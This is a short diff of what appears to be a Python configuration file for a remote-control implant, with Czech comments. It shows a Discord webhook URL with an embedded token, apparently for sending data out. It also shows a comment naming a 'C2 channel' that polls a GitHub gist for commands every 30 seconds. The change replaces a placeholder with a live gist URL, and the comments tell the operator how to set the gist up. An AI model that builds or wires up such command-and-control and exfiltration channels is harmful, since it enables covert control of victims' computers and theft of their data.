@@ -26,7 +26,7 @@ DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553128485424201800/7K1y
 # C2 channel — GitHub gist s commandy
 # Vytvoř gist na https://gist.github.com/ s obsahem "NONE"
 # Sem dej RAW URL toho gistu (klikni na Raw tlačítko)
-GIST_COMMAND_URL = "SEM_DEJ_RAW_GIST_URL"
+GIST_COMMAND_URL = "https://gist.githubusercontent.com/Mickjay07/f9a42765192efe58e0bbdff8ac76b959/raw/gistfile1.txt"
 
 POLL_INTERVAL = 30  # jak často kontrolovat gist (sekundy)
 
